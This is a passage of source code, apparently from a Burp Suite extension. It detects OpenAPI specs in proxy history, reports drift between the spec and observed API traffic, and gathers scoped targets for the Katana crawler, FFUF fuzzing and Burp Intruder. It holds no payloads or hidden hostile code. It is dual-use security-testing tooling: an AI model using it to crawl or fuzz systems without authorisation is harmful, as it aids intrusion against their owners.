        if chooser.showOpenDialog(self._panel) == JFileChooser.APPROVE_OPTION:
            path = chooser.getSelectedFile().getAbsolutePath()
            self.openapi_spec_field.setText(path)

    def _openapi_spec_candidate_score(self, path_lower):
        """Score likely OpenAPI/Swagger endpoints from observed paths."""
        safe_path = self._ascii_safe(path_lower, lower=True)
        score = 0

        if "openapi" in safe_path:
            score += 10
        if "swagger" in safe_path:
            score += 8
        if "api-docs" in safe_path:
            score += 7
        if safe_path.endswith(".json") or safe_path.endswith(".yaml") or safe_path.endswith(".yml"):
            score += 4
        if "/v3/api-docs" in safe_path or "/v2/api-docs" in safe_path:
            score += 3
        if "swagger-ui" in safe_path:
            score -= 4

        return score

    def _collect_openapi_spec_candidates(self, max_candidates=15):
        """Collect likely OpenAPI/Swagger targets from observed proxy history."""
        try:
            max_items = int(max_candidates)
        except Exception as e:
            self._callbacks.printError(
                "OpenAPI candidate max parsing failed: {}".format(self._ascii_safe(e))
            )
            max_items = 15
        if max_items <= 0:
            max_items = 15

        with self.lock:
            snapshot = list(self.api_data.values())

        candidate_map = {}
        for entries in snapshot:
            entry = self._get_entry(entries)
            method = self._ascii_safe(entry.get("method"), lower=True).strip().upper()
            if method not in ["GET", "HEAD", "OPTIONS"]:
                continue

            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            protocol = self._ascii_safe(entry.get("protocol"), lower=True).strip()
            path = self._ascii_safe(
                entry.get("path") or entry.get("normalized_path") or "/"
            ).strip()
            if not host or protocol not in ["http", "https"]:
                continue
            if not path.startswith("/"):
                path = "/" + path

            score = self._openapi_spec_candidate_score(path.lower())
            if score <= 0:
                continue

            query = self._ascii_safe(entry.get("query_string") or "").strip()
            candidate_url = "{}://{}{}".format(protocol, host, path)
            if query and any(
                token in query.lower() for token in ["url=", "format=", "spec=", "schema="]
            ):
                candidate_url = "{}?{}".format(candidate_url, query)

            existing = candidate_map.get(candidate_url)
            if (existing is None) or (score > existing.get("score", 0)):
                candidate_map[candidate_url] = {
                    "url": candidate_url,
                    "score": score,
                    "path": path,
                }

        ordered = sorted(
            candidate_map.values(),
            key=lambda x: (-int(x.get("score", 0) or 0), self._ascii_safe(x.get("url"), lower=True)),
        )
        return ordered[:max_items]

    def _show_openapi_spec_targets_popup(self, event):
        """Show selectable OpenAPI/Swagger targets from proxy history."""
        candidates = self._collect_openapi_spec_candidates(max_candidates=30)
        self.openapi_spec_candidates = list(candidates)
        if not candidates:
            if hasattr(self, "openapi_area") and self.openapi_area is not None:
                self.openapi_area.setText(
                    "[!] No OpenAPI/Swagger candidates found in proxy history\n"
                )
            return

        options = []
        for idx, item in enumerate(candidates):
            url = self._ascii_safe(item.get("url") or "").strip()
            if not url:
                continue
            score = int(item.get("score") or 0)
            options.append(
                {
                    "value": url,
                    "label": "#{:02d} [score {}] {}".format(idx + 1, score, url),
                }
            )

        preselected = list(getattr(self, "openapi_selected_spec_targets", []) or [])
        if not preselected:
            preselected = [item.get("value") for item in options]

        selected = self._show_multi_select_targets_popup(
            "OpenAPI Targets",
            options,
            preselected_values=preselected,
            footer_text=(
                "Default selection is all likely OpenAPI/Swagger targets from proxy history. "
                "Run Drift uses the first selected item in the field."
            ),
        )
        if selected is None:
            return

        self.openapi_selected_spec_targets = list(selected)
        if selected:
            self.openapi_spec_field.setText(self._ascii_safe(selected[0]))
            if hasattr(self, "openapi_area") and self.openapi_area is not None:
                self.openapi_area.append(
                    "[+] OpenAPI targets selected: {} (run target: {})\n".format(
                        len(selected), self._ascii_safe(selected[0])
                    )
                )
        else:
            self.openapi_spec_field.setText("")
            if hasattr(self, "openapi_area") and self.openapi_area is not None:
                self.openapi_area.append("[!] No OpenAPI targets selected\n")

    def _autoselect_openapi_spec_from_history(self, append_output=False, overwrite=False):
        """Preselect best OpenAPI candidate from proxy history."""
        if not hasattr(self, "openapi_spec_field") or self.openapi_spec_field is None:
            return None

        candidates = self._collect_openapi_spec_candidates()
        self.openapi_spec_candidates = list(candidates)
        if not candidates:
            if append_output and hasattr(self, "openapi_area") and self.openapi_area is not None:
                self.openapi_area.append("[!] No OpenAPI/Swagger candidates found in proxy history\n")
            return None

        candidate_urls = [
            self._ascii_safe(item.get("url") or "").strip()
            for item in candidates
            if self._ascii_safe(item.get("url") or "").strip()
        ]
        existing_selected = list(
            getattr(self, "openapi_selected_spec_targets", []) or []
        )
        if existing_selected and (not overwrite):
            selected_urls = [u for u in existing_selected if u in candidate_urls]
            if not selected_urls:
                selected_urls = list(candidate_urls)
            self.openapi_selected_spec_targets = list(selected_urls)
        else:
            self.openapi_selected_spec_targets = list(candidate_urls)

        if (not overwrite) and self.openapi_spec_field.getText().strip():
            return self._ascii_safe(self.openapi_spec_field.getText()).strip()

        selected = (
            self._ascii_safe(self.openapi_selected_spec_targets[0]).strip()
            if self.openapi_selected_spec_targets
            else self._ascii_safe(candidates[0].get("url") or "").strip()
        )
        if selected:
            self.openapi_spec_field.setText(selected)
            if append_output and hasattr(self, "openapi_area") and self.openapi_area is not None:
                self.openapi_area.append("[+] Auto-selected OpenAPI target: {}\n".format(selected))
                if len(candidates) > 1:
                    self.openapi_area.append("[*] Alternate candidates:\n")
                    for item in candidates[1:6]:
                        self.openapi_area.append("  - {}\n".format(self._ascii_safe(item.get("url") or "")))
            return selected
        return None

    def _detect_openapi_spec_from_history(self, event):
        """Manual refresh for OpenAPI candidate auto-selection from history."""
        selected = self._autoselect_openapi_spec_from_history(
            append_output=True, overwrite=True
        )
        if selected:
            self.log_to_ui("[+] OpenAPI candidate selected from proxy history")
        else:
            self.log_to_ui("[!] No OpenAPI candidate detected in proxy history")

    def _normalize_spec_path(self, path):
        """Normalize spec path placeholders to match Recon normalization."""
        raw = self._ascii_safe(path or "/").strip()
        if not raw.startswith("/"):
            raw = "/" + raw
        raw = re.sub(r"\{[^}]+\}", "{id}", raw)
        return self._normalize_path(raw)

    def _load_openapi_spec_text(self, source):
        """Load OpenAPI text from local file or URL."""
        src = self._ascii_safe(source).strip()
        if src.startswith("http://") or src.startswith("https://"):
            fetch_error = None
            try:
                import urllib2

                response = urllib2.urlopen(src, timeout=20)
                return self._ascii_safe(response.read())
            except ImportError as import_err:
                fetch_error = import_err
            except Exception as url_err:
                fetch_error = url_err

            try:
                import urllib.request as urllib_request

                response = urllib_request.urlopen(src, timeout=20)
                return self._ascii_safe(response.read())
            except Exception as url_err:
                message = "OpenAPI URL fetch failed: {}".format(self._ascii_safe(url_err))
                if fetch_error:
                    message = "{} (fallback after: {})".format(
                        message, self._ascii_safe(fetch_error)
                    )
                raise RuntimeError(message)
        with open(src, "r") as reader:
            return self._ascii_safe(reader.read())

    def _parse_openapi_json_doc(self, doc):
        """Parse OpenAPI JSON structure into endpoint/params metadata."""
        endpoints = set()
        params_map = {}
        server_urls = []
        methods = set(["get", "post", "put", "patch", "delete", "options", "head"])

        for server in (doc.get("servers", []) or []):
            url = self._ascii_safe((server or {}).get("url") or "").strip()
            if url:
                server_urls.append(url)

        paths = doc.get("paths", {}) or {}
        for raw_path, path_item in paths.items():
            normalized_path = self._normalize_spec_path(raw_path)
            if not isinstance(path_item, dict):
                continue
            common_params = []
            for p in (path_item.get("parameters", []) or []):
                if isinstance(p, dict):
                    name = self._ascii_safe(p.get("name") or "").strip()
                    if name:
                        common_params.append(name)
            for method, operation in path_item.items():
                method_l = self._ascii_safe(method, lower=True).strip()
                if method_l not in methods:
                    continue
                endpoint_key = "{}:{}".format(method_l.upper(), normalized_path)
                endpoints.add(endpoint_key)
                op_params = list(common_params)
                if isinstance(operation, dict):
                    for p in (operation.get("parameters", []) or []):
                        if isinstance(p, dict):
                            name = self._ascii_safe(p.get("name") or "").strip()
                            if name:
                                op_params.append(name)
                    request_body = operation.get("requestBody", {}) or {}
                    content = request_body.get("content", {}) if isinstance(request_body, dict) else {}
                    app_json = content.get("application/json", {}) if isinstance(content, dict) else {}
                    schema = app_json.get("schema", {}) if isinstance(app_json, dict) else {}
                    properties = schema.get("properties", {}) if isinstance(schema, dict) else {}
                    if isinstance(properties, dict):
                        for name in properties.keys():
                            safe_name = self._ascii_safe(name).strip()
                            if safe_name:
                                op_params.append(safe_name)
                params_map[endpoint_key] = sorted(set(op_params))
        return endpoints, params_map, server_urls

    def _parse_openapi_yaml_text(self, text):
        """Parse basic OpenAPI YAML path/method entries (lightweight fallback)."""
        endpoints = set()
        params_map = {}
        server_urls = []
        methods = set(["get", "post", "put", "patch", "delete", "options", "head"])
        current_path = ""
        in_paths = False

        for raw_line in self._ascii_safe(text).splitlines():
            line = raw_line.rstrip("\n")
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            if stripped == "paths:":
                in_paths = True
                continue
            if stripped.startswith("servers:"):
                in_paths = False
                continue
            if stripped.startswith("- url:"):
                server_url = self._ascii_safe(stripped.split(":", 1)[1]).strip()
                if server_url:
                    server_urls.append(server_url)
                continue
            if not in_paths:
                continue

            indent = len(line) - len(line.lstrip(" "))
            if indent <= 2 and stripped.endswith(":") and stripped.startswith("/"):
                current_path = stripped[:-1]
                continue
            if current_path and indent >= 4 and stripped.endswith(":"):
                method_name = self._ascii_safe(stripped[:-1], lower=True).strip()
                if method_name in methods:
                    endpoint_key = "{}:{}".format(
                        method_name.upper(), self._normalize_spec_path(current_path)
                    )
                    endpoints.add(endpoint_key)
                    params_map[endpoint_key] = []

        return endpoints, params_map, server_urls

    def _choose_openapi_base_url(self, server_urls):
        """Pick base URL for generating missing-endpoint candidates."""
        if server_urls:
            first = self._ascii_safe(server_urls[0]).strip()
            if first.startswith("http://") or first.startswith("https://"):
                return first.rstrip("/")

        preferred_host = ""
        try:
            if hasattr(self, "host_filter") and self.host_filter is not None:
                host_selected = self._ascii_safe(
                    str(self.host_filter.getSelectedItem()), lower=True
                ).strip()
                if host_selected and host_selected != "all":
                    preferred_host = host_selected
        except Exception as e:
            self._callbacks.printError(
                "OpenAPI base host selection error: {}".format(self._ascii_safe(e))
            )
            preferred_host = ""

        if not preferred_host:
            with self.lock:
                host_counts = {}
                for entries in self.api_data.values():
                    host = self._ascii_safe(self._get_entry(entries).get("host") or "", lower=True).strip()
                    if host:
                        host_counts[host] = host_counts.get(host, 0) + 1
            if host_counts:
                preferred_host = sorted(host_counts.items(), key=lambda item: (-item[1], item[0]))[0][0]

        if preferred_host:
            return "https://{}".format(preferred_host)
        return "https://example.com"

    def _run_openapi_drift(self, event):
        """Compare observed traffic with OpenAPI spec and report drift."""
        spec_source = self.openapi_spec_field.getText().strip()
        if not spec_source:
            selected = self._autoselect_openapi_spec_from_history(
                append_output=False, overwrite=False
            )
            spec_source = self.openapi_spec_field.getText().strip()
            if selected:
                self.openapi_area.setText(
                    "[+] Auto-selected OpenAPI target from proxy history: {}\n".format(
                        spec_source
                    )
                )
            else:
                self.openapi_area.setText("[!] Select OpenAPI/Swagger file or URL first\n")
                return
        if not self.api_data:
            self.openapi_area.setText("[!] No endpoints captured. Capture/import first.\n")
            return

        self.openapi_area.setText("[*] OpenAPI drift analysis starting...\n")
        self.openapi_area.append("[*] Source: {}\n\n".format(spec_source))
        self._clear_tool_cancel("openapidrift")

        def run_drift():
            try:
                text = self._load_openapi_spec_text(spec_source)
                if self._is_tool_cancelled("openapidrift"):
                    return

                parsed = None
                parse_error = None
                try:
                    doc = json.loads(text)
                    parsed = self._parse_openapi_json_doc(doc)
                except Exception as json_err:
                    parse_error = self._ascii_safe(json_err)

                if parsed is None:
                    parsed = self._parse_openapi_yaml_text(text)
                spec_endpoints, spec_params_map, server_urls = parsed

                with self.lock:
                    observed_snapshot = dict(self.api_data)
                observed_endpoints = set(observed_snapshot.keys())
                observed_params_map = {}
                for endpoint_key, entries in observed_snapshot.items():
                    entry = self._get_entry(entries)
                    param_names = set()
                    params = entry.get("parameters", {}) or {}
                    for ptype in ["url", "body", "json", "cookie"]:
                        values = params.get(ptype, {})
                        if isinstance(values, dict):
                            for name in values.keys():
                                safe_name = self._ascii_safe(name).strip()
                                if safe_name:
                                    param_names.add(safe_name)
                        elif isinstance(values, list):
                            for name in values:
                                safe_name = self._ascii_safe(name).strip()
                                if safe_name:
                                    param_names.add(safe_name)
                    observed_params_map[endpoint_key] = sorted(param_names)

                undocumented_observed = sorted(observed_endpoints - spec_endpoints)
                missing_observed = sorted(spec_endpoints - observed_endpoints)
                shared = sorted(observed_endpoints & spec_endpoints)
                param_drift = []
                for endpoint_key in shared:
                    spec_params = set(spec_params_map.get(endpoint_key, []) or [])
                    if not spec_params:
                        continue
                    observed_params = set(observed_params_map.get(endpoint_key, []) or [])
                    unexpected = sorted(observed_params - spec_params)
                    missing_params = sorted(spec_params - observed_params)
                    if unexpected or missing_params:
                        detail = "{} | unexpected={} | missing={}".format(
                            endpoint_key,
                            ",".join(unexpected[:6]) if unexpected else "-",
                            ",".join(missing_params[:6]) if missing_params else "-",
                        )
                        param_drift.append(detail)

                base_url = self._choose_openapi_base_url(server_urls)
                missing_candidates = []
                for endpoint_key in missing_observed:
                    if ":" not in endpoint_key:
                        continue
                    method, normalized_path = endpoint_key.split(":", 1)
                    path = self._ascii_safe(normalized_path).replace("{id}", "1")
                    if not path.startswith("/"):
                        path = "/" + path
                    missing_candidates.append(
                        {"method": method, "url": base_url + path, "endpoint_key": endpoint_key}
                    )

                lines = []
                lines.append("=" * 80)
                lines.append("OPENAPI DRIFT RESULTS")
                lines.append("=" * 80)
                lines.append("[*] Spec Endpoints: {}".format(len(spec_endpoints)))
                lines.append("[*] Observed Endpoints: {}".format(len(observed_endpoints)))
                lines.append("[*] Observed not in spec: {}".format(len(undocumented_observed)))
                lines.append("[*] Spec missing in observed: {}".format(len(missing_observed)))
                lines.append("[*] Shared Endpoints: {}".format(len(shared)))
                lines.append("[*] Param Drift Findings: {}".format(len(param_drift)))
                if parse_error:
                    lines.append("[*] JSON parse fallback used (YAML mode): {}".format(parse_error))
                lines.append("")
                lines.append("UNDOCUMENTED OBSERVED ENDPOINTS")
                lines.append("-" * 80)
                lines.extend(undocumented_observed[:80] if undocumented_observed else ["[+] None"])
                if len(undocumented_observed) > 80:
                    lines.append("[*] {} more not shown".format(len(undocumented_observed) - 80))
                lines.append("")
                lines.append("SPEC ENDPOINTS MISSING IN OBSERVED TRAFFIC")
                lines.append("-" * 80)
                lines.extend(missing_observed[:80] if missing_observed else ["[+] None"])
                if len(missing_observed) > 80:
                    lines.append("[*] {} more not shown".format(len(missing_observed) - 80))
                lines.append("")
                lines.append("PARAMETER DRIFT")
                lines.append("-" * 80)
                lines.extend(param_drift[:80] if param_drift else ["[+] None"])
                if len(param_drift) > 80:
                    lines.append("[*] {} more not shown".format(len(param_drift) - 80))

                with self.openapi_lock:
                    self.openapi_drift_results = list(lines)
                    self.openapi_missing_candidates = list(missing_candidates)

                if self._is_tool_cancelled("openapidrift"):
                    return
                SwingUtilities.invokeLater(
                    lambda t="\n".join(lines) + "\n": self.openapi_area.setText(t)
                )
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[+] OpenAPI drift complete: undocumented={} missing={} param-drift={}".format(
                            len(undocumented_observed),
                            len(missing_observed),
                            len(param_drift),
                        )
                    )
                )
            except Exception as e:
                SwingUtilities.invokeLater(
                    lambda m=self._ascii_safe(e): self.openapi_area.append(
                        "[!] OpenAPI drift failed: {}\n".format(m)
                    )
                )
                SwingUtilities.invokeLater(
                    lambda m=self._ascii_safe(e): self.log_to_ui(
                        "[!] OpenAPI drift error: {}".format(m)
                    )
                )
            finally:
                self._clear_tool_cancel("openapidrift")

        worker = threading.Thread(target=run_drift)
        worker.daemon = True
        worker.start()

    def _export_openapi_drift_results(self):
        """Export OpenAPI drift analysis output."""
        with self.openapi_lock:
            data = list(self.openapi_drift_results)
        self._export_list_to_file(
            data, "OpenAPI_Drift_Export", self.openapi_area, "openapi drift lines"
        )

    def _send_openapi_to_recon(self):
        """Send missing spec endpoints to Recon for active probing."""
        with self.openapi_lock:
            candidates = list(self.openapi_missing_candidates)
        if not candidates:
            self.openapi_area.append("\n[!] No missing spec endpoints to send\n")
            return
        self._import_endpoint_candidates_to_recon(
            candidates, "openapi-drift", self.openapi_area
        )

    def _export_katana_results(self):
        """Export Katana discovered endpoints - only saves when user clicks Export"""
        with self.katana_lock:
            data = list(self.katana_discovered)
        self._export_list_to_file(
            data, "Katana_Export", self.katana_area, "discovered URLs"
        )

    def _import_katana_to_recon(self):
        """Import Katana discovered endpoints to Recon tab"""
        with self.katana_lock:
            urls = list(self.katana_discovered)
        if not urls:
            self.katana_area.append(
                "\n[!] No discovered endpoints. Run crawler first\n"
            )
            return

        imported = 0
        for url in urls:
            try:
                # Ensure URL has protocol
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url

                parsed = URL(url)
                method = "GET"
                path = parsed.getPath() or "/"
                normalized = self._normalize_path(path)
                key = "{}:{}".format(method, normalized)

                with self.lock:
                    if key not in self.api_data:
                        protocol = parsed.getProtocol() or "http"
                        port = parsed.getPort()
                        if port == -1:
                            port = 443 if protocol == "https" else 80

                        entry = {
                            "method": method,
                            "path": path,
                            "normalized_path": normalized,
                            "host": parsed.getHost(),
                            "protocol": protocol,
                            "port": port,
                            "query_string": parsed.getQuery() or "",
                            "parameters": {
                                "url": {},
                                "body": {},
                                "cookie": {},
                                "json": {},
                            },
                            "headers": {},
                            "request_body": "",
                            "response_status": 200,
                            "response_headers": {},
                            "response_body": "",
                            "response_length": 0,
                            "response_time_ms": 0,
                            "content_type": "unknown",
                            "auth_detected": ["None"],
                            "api_patterns": ["Discovered"],
                            "jwt_detected": None,
                            "encryption_indicators": {
                                "likely_encrypted": False,
                                "types": [],
                            },
                            "param_patterns": {"reflected": [], "param_types": {}},
                        }
                        self.api_data[key] = [entry]
                        self.endpoint_tags[key] = ["katana"]
                        self.endpoint_times[key] = [0]
                        imported += 1
            except Exception as e:
                self._callbacks.printError(
                    "Error importing Katana URL: {}".format(str(e))
                )

        self.katana_area.append(
            "\n[+] Imported {} new endpoints to Recon tab\n".format(imported)
        )
        self.log_to_ui("[+] Imported {} Katana endpoints".format(imported))
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def _collect_katana_seed_urls(self):
        """Collect scoped Katana seed URLs from first-party Recon hosts."""
        with self.lock:
            entries_snapshot = [self._get_entry(entries) for entries in self.api_data.values()]

        scope_override = self._get_target_scope_override()
        host_counts = {}
        base_scores = {}
        for entry in entries_snapshot:
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host, scope_override
            ):
                continue
            host_counts[host] = host_counts.get(host, 0) + 1
            if (not scope_override.get("enabled")) and self._ffuf_is_noise_host(host):
                continue
            base = self._infer_base_domain(host)
            if not base:
                continue

            score = 1
            method = self._ascii_safe(entry.get("method"), lower=True).strip()
            if method in ["post", "put", "patch", "delete"]:
                score += 2
            path = self._ascii_safe(entry.get("normalized_path") or "/", lower=True)
            if "/api/" in path or "/graphql" in path:
                score += 3
            base_scores[base] = base_scores.get(base, 0) + score

        if scope_override.get("enabled"):
            selected_host = "target-bases"
            force_host = False
            allowed_bases = set(scope_override.get("bases", set()))
        else:
            selected_host = "all"
            try:
                if hasattr(self, "host_filter") and self.host_filter is not None:
                    selected_host = self._ascii_safe(
                        str(self.host_filter.getSelectedItem()), lower=True
                    ).strip()
            except Exception as e:
                self._callbacks.printError("Katana host-filter read error: {}".format(str(e)))
                selected_host = "all"
            force_host = bool(selected_host and selected_host != "all")

            sorted_bases = sorted(base_scores.items(), key=lambda item: (-item[1], item[0]))
            allowed_bases = set([base for base, _ in sorted_bases[:1]])
            if not allowed_bases:
                fallback_bases = {}
                for host, count in host_counts.items():
                    if self._ffuf_is_noise_host(host):
                        continue
                    base = self._infer_base_domain(host)
                    if not base:
                        continue
                    fallback_bases[base] = fallback_bases.get(base, 0) + count
                fallback_sorted = sorted(
                    fallback_bases.items(), key=lambda item: (-item[1], item[0])
                )
                allowed_bases = set([base for base, _ in fallback_sorted[:1]])

        dropped_noise_host = 0
        dropped_scope_host = 0
        inspected_entries = 0
        candidates = {}
        for entry in entries_snapshot:
            inspected_entries += 1
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                dropped_scope_host += 1
                continue
            if scope_override.get("enabled"):
                if not self._host_matches_target_scope(host, scope_override):
                    dropped_scope_host += 1
                    continue
            elif force_host:
                if host != selected_host:
                    dropped_scope_host += 1
                    continue
            else:
                if self._ffuf_is_noise_host(host):
                    dropped_noise_host += 1
                    continue
                host_base = self._infer_base_domain(host)
                if allowed_bases and host_base not in allowed_bases:
                    dropped_scope_host += 1
                    continue

            clean_url = self._clean_url(self._build_url(entry, False))
            if not clean_url:
                continue
            score = 1
            normalized_path = self._ascii_safe(
                entry.get("normalized_path") or "/", lower=True
            )
            if "/api/" in normalized_path or "/graphql" in normalized_path:
                score += 3
            if normalized_path.startswith("/v1") or normalized_path.startswith("/v2"):
                score += 2
            previous = candidates.get(clean_url)
            if previous is None or score > previous:
                candidates[clean_url] = score

        ordered = sorted(candidates.items(), key=lambda item: (-item[1], item[0]))
        raw_candidates = len(ordered)
        truncated = 0
        if raw_candidates > self.KATANA_MAX_TARGETS:
            truncated = raw_candidates - self.KATANA_MAX_TARGETS
            ordered = ordered[: self.KATANA_MAX_TARGETS]

        seeds = [url for url, _ in ordered]
        meta = {
            "inspected_entries": inspected_entries,
            "raw_candidates": raw_candidates,
            "dropped_noise_host": dropped_noise_host,
            "dropped_scope_host": dropped_scope_host,
            "truncated": truncated,
            "force_host": force_host,
            "selected_host": selected_host,
            "allowed_bases": sorted(list(allowed_bases)),
            "manual_scope_enabled": bool(scope_override.get("enabled")),
            "manual_scope_line_count": len(scope_override.get("lines", [])),
            "manual_scope_host_count": len(scope_override.get("hosts", set())),
            "manual_scope_base_count": len(scope_override.get("bases", set())),
            "manual_scope_preview": list(scope_override.get("lines", []))[:3],
        }
        return seeds, meta

    def _katana_result_in_scope(self, url, target_meta):
        """Keep Katana output focused on scoped first-party hosts."""
        text = self._ascii_safe(url).strip()
        if not text.lower().startswith(("http://", "https://")):
            return False
        try:
            parsed = URL(text)
            host = self._ascii_safe(parsed.getHost(), lower=True).strip()
        except Exception as e:
            self._callbacks.printError("Katana result parse error: {}".format(str(e)))
            return False
        if not host:
            return False

        if target_meta.get("force_host"):
            return host == target_meta.get("selected_host")

        if target_meta.get("manual_scope_enabled"):
            allowed_bases = set(target_meta.get("allowed_bases", []))
            if not allowed_bases:
                return True
            return self._infer_base_domain(host) in allowed_bases

        if self._ffuf_is_noise_host(host):
            return False
        allowed_bases = set(target_meta.get("allowed_bases", []))
        if not allowed_bases:
            return True
        return self._infer_base_domain(host) in allowed_bases

    def _run_katana(self, event):
        """Run Katana crawler on discovered domains"""
        return heavy_runners._run_katana(self, event)

    def _export_ffuf_results(self):
        """Export FFUF discovered paths - only saves when user clicks Export"""
        with self.ffuf_lock:
            data = list(self.ffuf_results)
        self._export_list_to_file(data, "FFUF_Export", self.ffuf_area, "results")

    def _send_ffuf_to_intruder(self):
        """Send FFUF results to Burp Intruder"""
        with self.ffuf_lock:
            results = list(self.ffuf_results)
        if not results:
            self.ffuf_area.append("\n[!] No results. Run fuzzer first\n")
            return

        self.ffuf_area.append("\n" + "=" * 80 + "\n")
        self.ffuf_area.append("[*] Sending to Burp Intruder...\n")

        try:
            sent = 0
            for result in results[:10]:
                parts = result.split()
                if len(parts) < 1:
                    continue

                # Try to find URL in FFUF output line
                url = None
                for part in parts:
                    if part.startswith("http://") or part.startswith("https://"):
                        url = part
                        break

                if not url:
                    continue

                parsed = URL(url)
                request = "GET {} HTTP/1.1\r\nHost: {}\r\n\r\n".format(
                    parsed.getPath(), parsed.getHost()
                )

                self._callbacks.sendToIntruder(
                    parsed.getHost(),
                    (
                        parsed.getPort()
                        if parsed.getPort() != -1
                        else (443 if parsed.getProtocol() == "https" else 80)
                    ),
                    parsed.getProtocol() == "https",
                    self._helpers.stringToBytes(request),
                )
                sent += 1

            self.ffuf_area.append("[+] Sent {} requests to Intruder\n".format(sent))
            self.log_to_ui("[+] Sent {} FFUF results to Intruder".format(sent))
        except Exception as e:
            self.ffuf_area.append("[!] Error: {}\n".format(str(e)))
            self.log_to_ui("[!] FFUF Intruder error: {}".format(str(e)))

    def _infer_base_domain(self, host):
        """Infer coarse base domain without external dependencies."""
        text = self._ascii_safe(host, lower=True).strip()
        if not text:
            return ""
        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", text):
            return text
        parts = [p for p in text.split(".") if p]
        if len(parts) < 2:
            return text
        second_level = parts[-2]
        if len(parts) >= 3 and second_level in ["co", "com", "org", "net", "gov", "edu", "ac"]:
            return ".".join(parts[-3:])
        return ".".join(parts[-2:])

    def _ffuf_is_noise_host(self, host):
        """Detect common third-party/tracker/CDN hosts to avoid FFUF noise."""
        text = self._ascii_safe(host, lower=True).strip()
        if not text:
            return True
        return any(pattern in text for pattern in self.FFUF_NOISE_HOST_PATTERNS)

    def _is_wayback_noise_host(self, host):
        """Wayback-specific host noise filter (adtech/tracker heavy domains)."""
        text = self._ascii_safe(host, lower=True).strip()
        if not text:
            return True
        if self._ffuf_is_noise_host(text):
            return True
        if any(pattern in text for pattern in self.WAYBACK_NOISE_HOST_PATTERNS):
            return True
        labels = [label for label in text.split(".") if label]
        if not labels:
            return True
        first_label = labels[0]
        if first_label in self.WAYBACK_NOISE_LABELS:
            return True
        if any(label.endswith("ads") or label.startswith("ads") for label in labels[:2]):
            return True
        return False

    def _ffuf_is_noise_path_segment(self, first_part):
        """Detect noisy/static-like first path segment for FFUF targeting."""
        seg = self._ascii_safe(first_part, lower=True).strip()
        if not seg:
            return True
        if any(noise in seg for noise in self.FFUF_NOISE_PATH_PARTS):
            return True
        if "{" in seg or "}" in seg:
            return True
        return False

    def _collect_ffuf_targets(self):
        """Collect prioritized FFUF targets from Recon with first-party filtering."""
        static_skip_parts = set(
            [
                "js",
                "css",
                "static",
                "dist",
                "assets",
                "images",
                "img",
                "fonts",
                "shreddit",
                "recaptcha",
                "gsi",
                "sw.js",
                "service-worker.js",
            ]
        )

        with self.lock:
            entries_snapshot = [self._get_entry(entries) for entries in self.api_data.values()]

        scope_override = self._get_target_scope_override()
        host_counts = {}
        base_scores = {}
        for entry in entries_snapshot:
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host, scope_override
            ):
                continue
            host_counts[host] = host_counts.get(host, 0) + 1
            if (not scope_override.get("enabled")) and self._ffuf_is_noise_host(host):
                continue

            base = self._infer_base_domain(host)
            if not base:
                continue

            score = 1
            method = self._ascii_safe(entry.get("method"), lower=True).strip()
            if method in ["post", "put", "patch", "delete"]:
                score += 2

            path = self._ascii_safe(entry.get("normalized_path") or "/", lower=True)
            first_part = ""
            parts = [p for p in path.strip("/").split("/") if p]
            if parts:
                first_part = parts[0]
                if first_part.startswith("api") or first_part in [
                    "v1",
                    "v2",
                    "v3",
                    "v4",
                    "graphql",
                    "rest",
                    "svc",
                    "internal",
                    "auth",
                    "oauth",
                ]:
                    score += 3

            parameters = entry.get("parameters", {})
            if isinstance(parameters, dict):
                for value in parameters.values():
                    if isinstance(value, list) and value:
                        score += 2
                        break
                    if isinstance(value, dict) and value:
                        score += 2
                        break

            base_scores[base] = base_scores.get(base, 0) + score

        if scope_override.get("enabled"):
            selected_host = "target-bases"
            force_host = False
            allowed_bases = set(scope_override.get("bases", set()))
        else:
            selected_host = "All"
            try:
                if hasattr(self, "host_filter") and self.host_filter is not None:
                    selected_host = self._ascii_safe(
                        str(self.host_filter.getSelectedItem()), lower=True
                    )
            except Exception as e:
                self._callbacks.printError("FFUF host-filter read error: {}".format(str(e)))
                selected_host = "All"

            force_host = selected_host and selected_host != "all"
            sorted_bases = sorted(base_scores.items(), key=lambda item: (-item[1], item[0]))
            allowed_bases = set([base for base, _ in sorted_bases[:1]])
            if not allowed_bases:
                fallback_bases = {}
                for host, count in host_counts.items():
                    if self._ffuf_is_noise_host(host):
                        continue
                    base = self._infer_base_domain(host)
                    if not base:
                        continue
                    fallback_bases[base] = fallback_bases.get(base, 0) + count
                fallback_sorted = sorted(
                    fallback_bases.items(), key=lambda item: (-item[1], item[0])
                )
                allowed_bases = set([base for base, _ in fallback_sorted[:1]])

        candidates = {}
        dropped_noise_host = 0
        dropped_scope_host = 0
        dropped_path = 0
        inspected_entries = 0
        for entry in entries_snapshot:
            inspected_entries += 1
            protocol = self._ascii_safe(entry.get("protocol"), lower=True).strip() or "https"
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                dropped_scope_host += 1
                continue

            if scope_override.get("enabled"):
                if not self._host_matches_target_scope(host, scope_override):
                    dropped_scope_host += 1
                    continue
            elif force_host:
                if host != selected_host:
                    dropped_scope_host += 1
                    continue
            else:
                if self._ffuf_is_noise_host(host):
                    dropped_noise_host += 1
                    continue
                if allowed_bases:
                    host_base = self._infer_base_domain(host)
                    if host_base not in allowed_bases:
                        dropped_scope_host += 1
                        continue

            port = entry.get("port", -1)
            if port == -1:
                port = 443 if protocol == "https" else 80
            if (protocol == "https" and port == 443) or (
                protocol == "http" and port == 80
            ):
                base = "{}://{}".format(protocol, host)
            else:
                base = "{}://{}:{}".format(protocol, host, port)

            path = self._ascii_safe(entry.get("normalized_path") or "/")
            parts = [p for p in path.strip("/").split("/") if p]
            if not parts:
                first_part = "api"
            else:
                first_part = self._ascii_safe(parts[0], lower=True).strip()

